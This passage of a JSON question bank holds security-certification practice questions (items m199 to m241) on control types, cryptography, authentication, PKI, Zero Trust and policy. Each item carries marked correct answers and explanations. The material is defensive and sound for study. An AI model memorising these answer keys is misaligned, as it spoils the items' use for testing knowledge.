      "exp": "Data anonymisation / pseudonymisation replaces or removes identifying information (names, account numbers, contact details) with synthetic values or tokens, allowing analytics to proceed on structurally similar data without exposing personal information. Encryption protects data in storage/transit but requires decryption to use. Password protection is weak. Access restriction reduces exposure but doesn't remove the risk if those two analysts' systems are compromised."
    },
    {
      "id": "m199",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Security Awareness",
      "q": "A CISO wants to measure whether the organisation's security awareness programme is achieving behavioural change, not just training completion. Which metric MOST effectively measures actual outcome rather than activity?",
      "opts": [
        "Percentage of employees who completed the annual training module",
        "Reduction in phishing simulation click rate and increase in suspicious email report rate over successive quarters",
        "Number of security policies updated this year",
        "Total training hours logged per department"
      ],
      "correct": 1,
      "exp": "Phishing simulation click rate reduction + suspicious email report rate increase are outcome metrics — they measure whether training is changing actual employee behaviour in real-world decision-making scenarios. Training completion, policy updates, and training hours are activity metrics that measure what was done, not whether it worked. Security+ and the CISM framework both emphasise measuring programme effectiveness through behavioural outcomes."
    },
    {
      "id": "m200",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Security Frameworks",
      "q": "An organisation's security policy states that \"all sensitive data must be encrypted at rest.\" The IT team interprets this differently — one team uses AES-128, another uses AES-256, and a third uses 3DES. Which governance document is MISSING that would resolve this inconsistency?",
      "opts": [
        "A more detailed security policy",
        "A security standard specifying the minimum encryption algorithm and key length required",
        "A security procedure for implementing encryption",
        "A security guideline recommending encryption best practices"
      ],
      "correct": 1,
      "exp": "A security standard defines specific mandatory technical requirements — e.g., \"all sensitive data at rest must be encrypted using AES-256 in GCM mode.\" Policies state what must be achieved; standards define precisely how. Without a standard, teams interpret policy differently, creating inconsistent and potentially inadequate controls. Procedures provide step-by-step implementation instructions. Guidelines are non-mandatory recommendations."
    },
  // ── Imported MCQs m201-m400 from preview.html ──
  {
      "id": "m201",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Control Categories",
      "q": "A bank vault requires two employees to be present before it can be opened, and neither employee alone knows the full combination. Which security concept does this BEST illustrate?",
      "opts": [
        "Least privilege",
        "Dual control / two-person integrity",
        "Need to know",
        "Job rotation"
      ],
      "correct": 1,
      "exp": "Dual control (two-person integrity) requires two authorised individuals to cooperate before a sensitive action can be completed — neither can act unilaterally. This prevents insider fraud. Job rotation exposes individuals to different roles over time. Least privilege limits access scope. Need to know restricts information access."
    },
    {
      "id": "m202",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Control Categories",
      "q": "A sprinkler system that automatically activates to suppress a server room fire is BEST classified as which type of security control?",
      "opts": [
        "Preventive",
        "Detective",
        "Corrective",
        "Compensating"
      ],
      "correct": 2,
      "exp": "A fire suppression system activates after a fire is detected to suppress it and minimise damage — this is a corrective control. Preventive controls stop incidents before they occur. Detective controls identify incidents. Compensating controls substitute for a primary control that cannot be applied."
    },
    {
      "id": "m203",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Control Categories",
      "q": "An organisation cannot afford MFA for all remote workers, so it implements strict source IP whitelisting for VPN access instead. What type of control is the IP whitelisting in this context?",
      "opts": [
        "Preventive control",
        "Detective control",
        "Compensating control",
        "Corrective control"
      ],
      "correct": 2,
      "exp": "When a primary control (MFA) cannot be implemented, an alternative that achieves a similar risk reduction is a compensating control. PCI DSS formally recognises compensating controls and requires documentation of why the primary control cannot be met and how the compensating control provides equivalent protection."
    },
    {
      "id": "m204",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Control Categories",
      "q": "A security policy requires quarterly penetration tests. Between tests, continuous automated scanning provides real-time alerts on new vulnerabilities. The penetration test is a ___ control; the continuous scanning is a ___ control.",
      "opts": [
        "Corrective / Preventive",
        "Detective / Detective",
        "Detective / Preventive",
        "Preventive / Detective"
      ],
      "correct": 1,
      "exp": "Both are detective controls — they identify vulnerabilities and security weaknesses rather than preventing attacks or correcting damage. Penetration testing discovers exploitable conditions. Continuous scanning detects newly introduced vulnerabilities. Neither directly prevents attacks or restores systems."
    },
    {
      "id": "m205",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Control Categories",
      "q": "An organisation implements mandatory annual security awareness training for all staff. Which control category does this PRIMARILY represent?",
      "opts": [
        "Technical control",
        "Physical control",
        "Administrative / managerial control",
        "Operational control"
      ],
      "correct": 2,
      "exp": "Security awareness training is an administrative (managerial) control — it uses policies, procedures, and training to manage security risk through people and processes rather than technology. Technical controls use hardware/software. Physical controls use barriers and environmental measures."
    },
    {
      "id": "m206",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Cryptography Concepts",
      "q": "Which asymmetric algorithm is specifically designed for key exchange and does NOT support encryption or digital signatures directly?",
      "opts": [
        "RSA",
        "Elliptic Curve Digital Signature Algorithm (ECDSA)",
        "Diffie-Hellman (DH)",
        "DSA (Digital Signature Algorithm)"
      ],
      "correct": 2,
      "exp": "Diffie-Hellman is a key exchange algorithm — it allows two parties to establish a shared secret over an untrusted channel without transmitting the secret. It does not encrypt data or create signatures. RSA can do both encryption and signatures. ECDSA and DSA are signature-only algorithms."
    },
    {
      "id": "m207",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Cryptography Concepts",
      "q": "A cryptographic function maps input data of any size to a fixed-length output and must be computationally infeasible to reverse. Additionally, finding two different inputs that produce the same output must be extremely difficult. This second property is called:",
      "opts": [
        "Preimage resistance",
        "Second preimage resistance",
        "Collision resistance",
        "Avalanche effect"
      ],
      "correct": 2,
      "exp": "Collision resistance means it is computationally infeasible to find any two different inputs that produce the same hash output. Preimage resistance means you cannot find the input given the hash output. Second preimage resistance means given one input, you cannot find a different input with the same hash. SHA-256 provides all three; MD5 lacks collision resistance."
    },
    {
      "id": "m208",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Cryptography Concepts",
      "q": "An encrypted message can only be read by the intended recipient, but the recipient cannot verify who sent it. Which cryptographic property is missing?",
      "opts": [
        "Confidentiality",
        "Integrity",
        "Authentication / Non-repudiation",
        "Availability"
      ],
      "correct": 2,
      "exp": "The scenario describes confidentiality (message is encrypted — only recipient can read it) but lacks authentication — the recipient cannot verify the sender's identity. Adding a digital signature (using the sender's private key) provides authentication and non-repudiation. Integrity is verified by the hash within the signature."
    },
    {
      "id": "m209",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Cryptography Concepts",
      "q": "A developer uses AES-256 in ECB (Electronic Codebook) mode for encrypting a large image file. What is the CRITICAL weakness of this approach?",
      "opts": [
        "ECB mode does not support 256-bit keys",
        "ECB mode encrypts each block independently with the same key — identical plaintext blocks produce identical ciphertext blocks, revealing data patterns",
        "ECB mode requires an IV which must be shared securely",
        "ECB mode is slower than CBC for large files"
      ],
      "correct": 1,
      "exp": "AES-ECB mode encrypts each 128-bit block independently. Identical plaintext blocks produce identical ciphertext — making patterns visible in the ciphertext (e.g., repeating pixels in an image remain visually recognisable). This is why encrypted ECB-mode Linux penguin images still show the penguin shape. Secure modes (CBC, CTR, GCM) use IVs/nonces to ensure identical plaintext produces different ciphertext."
    },
    {
      "id": "m210",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Cryptography Concepts",
      "q": "An organisation is planning for a quantum computing threat to their encryption infrastructure. Which current asymmetric algorithm is considered MOST vulnerable to Shor's algorithm on a sufficiently powerful quantum computer?",
      "opts": [
        "AES-256",
        "RSA-2048",
        "SHA-3",
        "HMAC-SHA256"
      ],
      "correct": 1,
      "exp": "Shor's algorithm can efficiently factor large integers and compute discrete logarithms, directly breaking RSA (and ECC, DH) whose security relies on these mathematical hardness assumptions. AES-256 and SHA-3 are symmetric/hash functions — Grover's algorithm only halves their effective security (128-bit equivalent for AES-256). HMAC-SHA256 remains secure against quantum attacks. NIST's post-quantum standards (CRYSTALS-Kyber, CRYSTALS-Dilithium) replace RSA and ECC."
    },
    {
      "id": "m211",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Cryptography Concepts",
      "q": "What is the PRIMARY purpose of adding a salt to a password before hashing it?",
      "opts": [
        "To make the hash longer and harder to brute-force",
        "To prevent two users with identical passwords from having identical hashes, defeating precomputed rainbow table attacks",
        "To encrypt the password so it can be recovered by administrators",
        "To comply with FIPS 140-2 requirements"
      ],
      "correct": 1,
      "exp": "A salt is a random value unique to each user, prepended to the password before hashing. This ensures two users with \"Password123\" have completely different stored hashes, making precomputed rainbow tables useless — an attacker must brute-force each hash individually. The salt is stored alongside the hash in plaintext; its secrecy is not required."
    },
    {
      "id": "m212",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Cryptography Concepts",
      "q": "Which cryptographic mode of operation provides both confidentiality AND data integrity (authenticated encryption) in a single pass, making it widely used in TLS 1.3 and disk encryption?",
      "opts": [
        "AES-CBC with HMAC-SHA256 applied separately",
        "AES-GCM (Galois/Counter Mode)",
        "AES-ECB with CRC32 checksum",
        "3DES-CBC"
      ],
      "correct": 1,
      "exp": "AES-GCM is an Authenticated Encryption with Associated Data (AEAD) mode — it provides confidentiality through CTR mode encryption AND integrity/authentication through the Galois Message Authentication Code (GMAC) in a single efficient pass. TLS 1.3 mandates AEAD-only cipher suites. AES-CBC requires a separate HMAC for integrity (older approach, more complex, more error-prone)."
    },
    {
      "id": "m213",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Cryptography Concepts",
      "q": "A company digitally signs software packages before distribution. Customers verify the signature before installation. Which security properties does this provide? (Select the BEST answer)",
      "opts": [
        "Confidentiality and availability",
        "Integrity and non-repudiation — the software has not been tampered with, and the publisher cannot deny having signed it",
        "Confidentiality only — the software is encrypted",
        "Availability — ensures the software can be downloaded"
      ],
      "correct": 1,
      "exp": "Digital signatures provide: Integrity — any modification to the signed data invalidates the signature. Non-repudiation — the publisher cannot deny signing, as only they hold the private key. Signatures do NOT provide confidentiality (the signed data is still readable). Code signing is used by Windows (Authenticode), Apple, and software repositories to detect tampered software."
    },
    {
      "id": "m214",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Cryptography Concepts",
      "q": "Which of the following describes a chosen-plaintext attack (CPA)?",
      "opts": [
        "An attacker who can observe encrypted traffic and infer the key from ciphertext patterns",
        "An attacker who can submit arbitrary plaintext messages and observe the resulting ciphertext to deduce the key or algorithm behaviour",
        "An attacker who intercepts a single encrypted message and attempts to decrypt it without any additional information",
        "An attacker who modifies ciphertext and observes the decryption result"
      ],
      "correct": 1,
      "exp": "In a chosen-plaintext attack, the attacker can choose arbitrary plaintexts and obtain their encryptions. This is stronger than known-plaintext attacks (where the attacker only sees some plaintext-ciphertext pairs without choosing them). It is weaker than chosen-ciphertext attacks (where the attacker can decrypt arbitrary ciphertexts). Public-key systems are typically tested against CPA security."
    },
    {
      "id": "m215",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Authentication Methods",
      "q": "A user authenticates to a corporate system using their username, password, and the answer to a security question (\"What was your first pet's name?\"). How many authentication factors are in use?",
      "opts": [
        "Three factors — username, password, and security question",
        "One factor — all three are \"something you know\" elements",
        "Two factors — username and password are one factor; security question is the second",
        "Zero factors — security questions are not a valid authentication factor"
      ],
      "correct": 1,
      "exp": "Authentication factors are categories, not individual items. Username + password + security question all fall under \"something you know\" — they are one factor, not three. Multiple items within the same category do NOT constitute MFA. Adding a second category (something you have or are) creates genuine MFA."
    },
    {
      "id": "m216",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Authentication Methods",
      "q": "An organisation deploys passwordless authentication where employees tap a hardware key and the system verifies a cryptographic challenge without any shared secret. This is BEST described as:",
      "opts": [
        "TOTP-based MFA",
        "Certificate-based smart card authentication",
        "FIDO2 / WebAuthn passwordless authentication",
        "RADIUS challenge-response authentication"
      ],
      "correct": 2,
      "exp": "FIDO2/WebAuthn enables passwordless authentication using public-key cryptography. The hardware key (authenticator) stores a private key that never leaves the device; the server stores only the public key. Authentication is a challenge-response: the server sends a challenge, the authenticator signs it with the private key, the server verifies with the public key. No shared secret (password) is transmitted or stored on the server."
    },
    {
      "id": "m217",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Authentication Methods",
      "q": "In a federated identity environment using SAML 2.0, which entity is responsible for asserting the user's identity to a cloud application?",
      "opts": [
        "The cloud application (Service Provider) performs the assertion",
        "The Identity Provider (IdP) creates and signs a SAML assertion after authenticating the user",
        "The user's browser generates the assertion from locally stored credentials",
        "The Certificate Authority issues the assertion based on the user's certificate"
      ],
      "correct": 1,
      "exp": "In SAML 2.0: the Identity Provider (IdP) — typically Active Directory with ADFS, Okta, or Azure AD — authenticates the user and generates a digitally signed XML assertion containing identity claims. The assertion is sent to the Service Provider (SP) — the cloud application — which trusts the IdP and grants access. The SP never sees the user's credentials; it trusts the signed assertion."
    },
    {
      "id": "m218",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Authentication Methods",
      "q": "Which authentication factor type does a retinal scan belong to?",
      "opts": [
        "Something you know",
        "Something you have",
        "Something you are",
        "Somewhere you are"
      ],
      "correct": 2,
      "exp": "A retinal scan is a biometric authentication method — it measures a physical characteristic of the person. This falls under \"something you are\" (inherence factor). The four main factor types are: something you know (password, PIN), something you have (token, smart card), something you are (biometrics), and somewhere you are (geolocation — sometimes listed as a fourth factor)."
    },
    {
      "id": "m219",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Authentication Methods",
      "q": "An employee's TOTP authenticator app generates codes that expire every 30 seconds. An attacker intercepts a valid TOTP code and tries to use it 45 seconds later. What prevents the attack from succeeding?",
      "opts": [
        "The TOTP algorithm detects replay attacks by blacklisting used codes",
        "TOTP codes are time-bound — the code is only valid within the current and possibly adjacent 30-second time windows; after expiry, a new code is generated that the attacker does not have",
        "The TOTP app encrypts the code so it cannot be intercepted",
        "The server requires the IP address to match the original request"
      ],
      "correct": 1,
      "exp": "TOTP (Time-based One-Time Password) codes are generated from: shared secret + current Unix time (divided into 30-second intervals). A code valid at T=0 is invalid at T=45 because the time window has advanced. Some implementations allow a one-window tolerance (±30s for clock drift). This time-binding prevents replay attacks as long as the attacker cannot use the code within the valid window."
    },
    {
      "id": "m220",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Authentication Methods",
      "q": "A mobile banking application implements biometric authentication using the device fingerprint sensor. The biometric data is processed entirely on the device and the result (pass/fail) is sent to the server. What is the PRIMARY security advantage of this \"on-device\" model?",
      "opts": [
        "On-device processing is faster, reducing latency",
        "Biometric templates are never transmitted to or stored on the server — eliminating the risk of centralised biometric data breach",
        "On-device processing uses stronger encryption than server-side",
        "The server can verify biometric accuracy more reliably"
      ],
      "correct": 1,
      "exp": "The on-device biometric model (used by FIDO2/WebAuthn and Apple Face ID/Touch ID) stores biometric templates in a secure enclave on the device. The server only receives a cryptographic proof of successful biometric match — never the biometric data itself. This prevents catastrophic breach scenarios where a server storing millions of fingerprint templates is compromised. Biometric data, unlike passwords, cannot be changed."
    },
    {
      "id": "m221",
      "ch": "1",
      "difficulty": "easy",
      "topic": "PKI & Certificate Management",
      "q": "A website presents a certificate where the Subject field is \"CN=*.company.com\". Which type of certificate is this?",
      "opts": [
        "Subject Alternative Name (SAN) certificate",
        "Extended Validation (EV) certificate",
        "Wildcard certificate",
        "Self-signed certificate"
      ],
      "correct": 2,
      "exp": "A wildcard certificate (CN=*.company.com) secures any single-level subdomain of a domain — e.g., www.company.com, mail.company.com, api.company.com. It does NOT cover the apex domain (company.com) or multiple levels (a.b.company.com). SAN certificates explicitly list multiple specific domains. EV certificates undergo enhanced organisational validation. Self-signed certificates are issued by the entity itself."
    },
    {
      "id": "m222",
      "ch": "1",
      "difficulty": "medium",
      "topic": "PKI & Certificate Management",
      "q": "An organisation's PKI uses a two-tier hierarchy. The Root CA signed an Intermediate CA certificate, and the Intermediate CA signs all end-entity certificates. If the Intermediate CA is compromised, which action allows the organisation to recover WITHOUT rebuilding the entire PKI?",
      "opts": [
        "Revoke all end-entity certificates immediately",
        "Have the Root CA revoke the compromised Intermediate CA certificate, then issue a new Intermediate CA",
        "Revoke the Root CA certificate and issue a new one",
        "Wait for all Intermediate CA-signed certificates to expire naturally"
      ],
      "correct": 1,
      "exp": "The two-tier PKI hierarchy exists precisely for this recovery scenario. The offline Root CA revokes the compromised Intermediate CA (adding it to the CRL), then issues a new Intermediate CA certificate. The Root CA trust anchor is preserved. Only certificates signed by the compromised Intermediate need to be reissued — not the entire PKI. This is why Root CAs are kept offline."
    },
    {
      "id": "m223",
      "ch": "1",
      "difficulty": "medium",
      "topic": "PKI & Certificate Management",
      "q": "What is Certificate Transparency (CT), and what security problem does it address?",
      "opts": [
        "CT is a protocol for encrypting certificate data during transmission",
        "CT is a public, append-only log of all issued TLS certificates — it allows domain owners and browsers to detect misissued or fraudulent certificates",
        "CT is a CA validation process that replaces domain validation (DV)",
        "CT is a revocation mechanism that replaces OCSP"
      ],
      "correct": 1,
      "exp": "Certificate Transparency requires CAs to log all issued certificates to publicly auditable append-only logs. This allows: (1) Domain owners to monitor for unauthorised certificates issued for their domains. (2) Browsers to reject certificates not appearing in CT logs. CT detects but does not prevent misissued certificates — it ensures they cannot be used secretly. Chrome requires CT for all certificates since 2018."
    },
    {
      "id": "m224",
      "ch": "1",
      "difficulty": "hard",
      "topic": "PKI & Certificate Management",
      "q": "A security engineer wants to ensure that client certificates used for mutual TLS (mTLS) authentication cannot be used after an employee leaves, even before they expire. Which PKI mechanism allows immediate revocation and real-time checking?",
      "opts": [
        "CRL published weekly",
        "OCSP with Must-Staple header in the certificate",
        "Certificate pinning",
        "Increasing the CA's CRL distribution frequency to hourly"
      ],
      "correct": 1,
      "exp": "OCSP with Must-Staple (TLS Feature extension) addresses both revocation timeliness and the \"soft-fail\" problem. Must-Staple requires that the server provide a current OCSP staple — if absent, clients must hard-fail (reject the connection). Regular OCSP provides real-time status. Must-Staple prevents an attacker from stripping the OCSP staple to force soft-fail behaviour. CRLs are batch and stale. Pinning prevents changing certificates."
    },
    {
      "id": "m225",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Security Principles",
      "q": "An administrator uses a separate privileged account for administrative tasks and a standard user account for daily work like email and web browsing. Which security principle does this practice implement?",
      "opts": [
        "Defence in depth",
        "Account separation implementing least privilege — administrative rights are not used for non-administrative tasks",
        "Separation of duties",
        "Non-repudiation"
      ],
      "correct": 1,
      "exp": "Using separate accounts for privileged vs. routine tasks implements least privilege through account separation. If malware infects the system through email while browsing, it runs with standard user privileges — not administrator rights. This limits the blast radius. It also implements privilege separation: elevated rights are used only when genuinely required."
    },
    {
      "id": "m226",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Security Principles",
      "q": "Zero Trust Architecture challenges a traditional security assumption. Which assumption does Zero Trust EXPLICITLY reject?",
      "opts": [
        "Users require authentication to access resources",
        "Encryption protects data in transit",
        "Users and devices inside the corporate network perimeter are implicitly trusted",
        "Multi-factor authentication improves security"
      ],
      "correct": 2,
      "exp": "Traditional perimeter security assumes that anything inside the network is trusted. Zero Trust explicitly rejects this: \"never trust, always verify.\" Internal traffic is treated with the same scrutiny as external. This is critical because lateral movement after an internal compromise relies on implicit internal trust. Zero Trust requires identity verification, device health checks, and least-privilege access for every request regardless of location."
    },
    {
      "id": "m227",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Security Principles",
      "q": "A threat model for a web application identifies that an attacker who gains access to the application layer should be prevented from accessing the database directly. Which architectural principle does the recommended countermeasure (requiring database queries to go through a hardened API layer) implement?",
      "opts": [
        "Security through obscurity",
        "Fail-secure",
        "Attack surface reduction and defence in depth through layered access control",
        "Non-repudiation"
      ],
      "correct": 2,
      "exp": "Requiring all database access to pass through a hardened API layer implements defence in depth (multiple layers) and attack surface reduction (the database is not directly exposed). Even if an attacker compromises the web application, they still face the API layer's access controls, input validation, and parameterised queries before reaching the database. This is a classic three-tier architecture security principle."
    },
    {
      "id": "m228",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Security Principles",
      "q": "The concept of \"fail-secure\" means that when a security system fails:",
      "opts": [
        "It sends an alert to the security team before failing",
        "It defaults to the most restrictive (secure) state — for example, a failed access control system locks the door rather than opening it",
        "It automatically switches to a backup system",
        "It logs the failure for later investigation"
      ],
      "correct": 1,
      "exp": "Fail-secure (also called fail-closed) means that upon failure, the system defaults to the secure state — denying access. A fire door fails open (fail-safe — for life safety), but a data centre door controller should fail-secure (deny access when the controller fails). Compare with fail-open: where failure defaults to allowing access. Security systems should generally fail-secure; life safety systems may fail-open."
    },
    {
      "id": "m229",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Security Principles",
      "q": "A developer is designing an authentication system and decides that after three failed login attempts, the account should be locked for five minutes. This implements which security concept?",
      "opts": [
        "Account lockout — a rate-limiting control to mitigate brute-force attacks",
        "Separation of duties",
        "Credential stuffing detection",
        "Non-repudiation"
      ],
      "correct": 0,
      "exp": "Account lockout is a rate-limiting mechanism that slows brute-force and credential stuffing attacks. After N failed attempts, the account is locked for a period, forcing attackers to wait. NIST SP 800-63B guidance recommends against unlimited lockouts (which can enable DoS) and instead recommends throttling, CAPTCHA, and monitoring. The 5-minute lockout is a common balance between security and usability."
    },
    {
      "id": "m230",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Security Principles",
      "q": "In a microservices architecture, service A needs to query service B. The architect proposes allowing all inter-service communication within the cluster without authentication, arguing that the cluster network is trusted. Which security principle does this VIOLATE?",
      "opts": [
        "Defence in depth only — inter-service auth would just add complexity",
        "Zero Trust — lateral movement within the cluster would be unconstrained if any service is compromised; each service request should be authenticated (e.g., mTLS)",
        "Separation of duties — services should not communicate directly",
        "Non-repudiation — services cannot deny communication without auth"
      ],
      "correct": 1,
      "exp": "Implicit trust within a cluster violates Zero Trust. If one microservice is compromised (via XSS, SSRF, or supply chain attack), an attacker can call all other services with full trust — unconstrained lateral movement. Mutual TLS (mTLS) authenticates both parties; service meshes (Istio, Linkerd) automate this. Every service-to-service request should be authenticated and authorised."
    },
    {
      "id": "m231",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Security Policies & Procedures",
      "q": "An organisation's acceptable use policy (AUP) prohibits using corporate laptops for personal social media. A new employee violates this policy on their first week. What does this scenario highlight about the AUP?",
      "opts": [
        "The AUP is insufficient — social media should be technically blocked by a web filter",
        "The AUP requires employees to read and acknowledge it; violation after acknowledgement enables disciplinary action and demonstrates the need for technical enforcement as a complementary control",
        "The AUP should be more detailed",
        "The employee needs MFA on their laptop"
      ],
      "correct": 1,
      "exp": "An AUP is an administrative control — it establishes expectations and liability but relies on human compliance. Effective AUPs require signed acknowledgement (establishing informed consent) and are reinforced by technical controls (web content filtering, DLP). Administrative controls alone are insufficient; defence in depth uses both administrative and technical controls."
    },
    {
      "id": "m232",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Security Policies & Procedures",
      "q": "During a planned database migration, the change advisory board (CAB) approves the change after reviewing a detailed implementation plan. Forty-eight hours before the scheduled change, a critical vulnerability is discovered in the database version being migrated to. What should happen next?",
      "opts": [
        "Proceed as planned — CAB approval is final",
        "Abort the change entirely without further process",
        "Raise an emergency change or submit a change modification to the CAB, presenting the new vulnerability information before proceeding",
        "Proceed but schedule a separate change to patch the vulnerability immediately after migration"
      ],
      "correct": 2,
      "exp": "Approved changes assume the conditions at approval time. A significant new variable (critical vulnerability in the target version) invalidates the original risk assessment. The change should be modified or re-reviewed by the CAB before proceeding. Most change management frameworks have an emergency change path for time-sensitive situations. Proceeding knowingly into a vulnerable state without CAB awareness bypasses governance."
    },
    {
      "id": "m233",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Security Policies & Procedures",
      "q": "A company's data retention policy states that customer records must be retained for 7 years for legal compliance. A customer requests deletion of their data under GDPR's right to erasure. How should the organisation respond?",
      "opts": [
        "Delete all data immediately — GDPR supersedes all other legal obligations",
        "Refuse deletion entirely — the retention policy takes absolute precedence",
        "Assess which data can be deleted (data not required by legal obligation) and which must be retained, informing the customer of the legal basis for retention of remaining data",
        "Archive the data in an encrypted vault — this satisfies both requirements"
      ],
      "correct": 2,
      "exp": "GDPR Article 17 Right to Erasure is NOT absolute. One of the explicit exceptions is retention required by legal obligation (Article 17(3)(b)). The correct approach: delete what is not legally required to be retained (e.g., marketing data, browsing history) and retain what is legally mandated (e.g., financial transaction records), with a clear explanation to the customer. This requires a granular data inventory to distinguish data categories."
    },
    {
      "id": "m234",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Security Policies & Procedures",
      "q": "A security awareness training programme teaches employees to recognise phishing emails. This is PRIMARILY which type of security control?",
      "opts": [
        "Technical control",
        "Physical control",
        "Administrative control — specifically a preventive administrative control",
        "Compensating control"
      ],
      "correct": 2,
      "exp": "Security awareness training is an administrative (preventive) control — it uses education and policy to change human behaviour and prevent security incidents. Administrative controls involve policies, procedures, training, and guidelines. While not technically enforced, training reduces click rates on phishing links, making it a meaningful preventive measure alongside technical controls like email filtering."
    },
    {
      "id": "m235",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Security Policies & Procedures",
      "q": "An employee notices their colleague's workstation is unlocked and unattended at a sensitive area. Rather than accessing it, they lock it using the keyboard shortcut. Which policy has the colleague most likely violated, and what is the employee's action called?",
      "opts": [
        "Acceptable use policy / tailgating",
        "Clean desk policy / reporting an incident",
        "Workstation locking policy / acting as a security champion in applying a compensating control",
        "Data classification policy / applying a corrective control"
      ],
      "correct": 2,
      "exp": "The colleague violated the workstation locking policy (requiring users to lock screens when leaving). The observant employee's corrective action (locking the screen) acts as a compensating/corrective control. Encouraging this culture of mutual accountability — \"security champions\" — is part of effective security culture. Many policies require both a technical enforcement (auto-lock after N minutes of inactivity) and an administrative requirement (lock manually when leaving)."
    },
    {
      "id": "m236",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Cryptography Concepts",
      "q": "Which of the following statements about steganography is CORRECT?",
      "opts": [
        "Steganography encrypts data so it cannot be read without the key",
        "Steganography hides data within another file (such as an image) so that the existence of the hidden data is not apparent",
        "Steganography is a hash function used for data integrity verification",
        "Steganography generates one-time pads for secure communication"
      ],
      "correct": 1,
      "exp": "Steganography conceals the existence of data by hiding it within innocuous carrier files (images, audio, video, documents). Unlike encryption which makes data unreadable but visible, steganography aims to make the data invisible. Attackers use it to exfiltrate data in image files uploaded to cloud services. Detection requires specialised steganalysis tools."
    },
    {
      "id": "m237",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Authentication Methods",
      "q": "An organisation uses 802.1X for wired network authentication. A contractor plugs their unmanaged laptop into an Ethernet port and immediately has network access. What has MOST likely failed?",
      "opts": [
        "The 802.1X configuration is correct — contractors are in the guest VLAN",
        "The switch port is configured as a trunk port instead of an access port",
        "The switch port has 802.1X disabled or is configured to allow access during the authentication grace period without enforcement",
        "The laptop is using MAC spoofing to bypass authentication"
      ],
      "correct": 2,
      "exp": "If an unauthenticated device immediately gains access, the most likely cause is that the 802.1X enforcement is not enabled on that port (it may be monitoring-only or in open/monitor mode), or the port has a guest VLAN configured without authentication, or the grace timer is set too long. 802.1X should fail-closed — no authentication, no access — for security-critical implementations."
    },
    {
      "id": "m238",
      "ch": "1",
      "difficulty": "easy",
      "topic": "PKI & Certificate Management",
      "q": "An engineer runs \"openssl verify -CAfile root_ca.crt server.crt\" and receives \"server.crt: OK\". What has this command confirmed?",
      "opts": [
        "The server certificate was not revoked",
        "The server certificate was signed by the CA specified, the chain is valid, and the certificate has not expired",
        "The server certificate supports the required cipher suites",
        "The server is currently reachable and presenting this certificate"
      ],
      "correct": 1,
      "exp": "\"openssl verify\" checks: (1) The certificate's digital signature was created by the specified CA. (2) The certificate chain is valid. (3) The certificate has not expired. It does NOT check revocation status (for that, use -crl_check with a CRL or check OCSP separately). It does not test network connectivity or cipher suites."
    },
    {
      "id": "m239",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Security Principles",
      "q": "A security architect is designing a system where even if the database is compromised and all data is stolen, attackers cannot determine what the original values were for the most sensitive fields. Which approach BEST achieves this for credit card numbers?",
      "opts": [
        "Encrypting credit card numbers with AES-256 using a master key",
        "Hashing credit card numbers with SHA-256 without a salt",
        "Tokenisation — replacing card numbers with random tokens; the mapping is stored in a separate, hardened token vault",
        "Masking — displaying only the last four digits"
      ],
      "correct": 2,
      "exp": "Tokenisation replaces sensitive data with random tokens with no mathematical relationship to the original. If the main database is compromised, tokens are useless without the token vault. Encryption protects data but the master key can be sought. Hashing without salt is vulnerable to rainbow tables (credit card number space is finite and predictable). Masking is display-only — the underlying data is still stored. PCI DSS explicitly recognises tokenisation as reducing cardholder data scope."
    },
    {
      "id": "m240",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Security Policies & Procedures",
      "q": "A large organisation is evaluating whether to self-sign their internal CA certificates or use a commercial CA. What is the PRIMARY advantage of using an internally managed CA for internal services?",
      "opts": [
        "Internal CAs are always more secure than commercial CAs",
        "Internal CAs allow certificate issuance without external dependencies, at any scale, for any internal hostname, without per-certificate cost — including for internal-only hostnames that public CAs cannot validate",
        "Commercial CAs refuse to sign internal hostname certificates",
        "Internal CAs are easier to configure and manage"
      ],
      "correct": 1,
      "exp": "An internal (private) CA provides: (1) Certificates for internal hostnames (e.g., db-server.internal) that public CAs cannot validate via DNS/HTTP. (2) No per-certificate cost at scale. (3) Full control over policies, validity periods, and revocation. The drawback: the root CA must be distributed and trusted on all clients. Commercial CAs have their roots pre-trusted in browsers/OS. For internal services accessible only to corporate devices, an internal CA is standard practice."
    },
    {
      "id": "m241",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Threat Intelligence",
      "q": "A security team subscribes to threat intelligence feeds that provide IP addresses, domain names, and file hashes associated with known malicious activity. These data points are called:",
      "opts": [
        "Tactics, Techniques, and Procedures (TTPs)",
        "Indicators of Compromise (IoCs)",
        "Common Vulnerabilities and Exposures (CVEs)",
        "Attack patterns"
      ],
      "correct": 1,
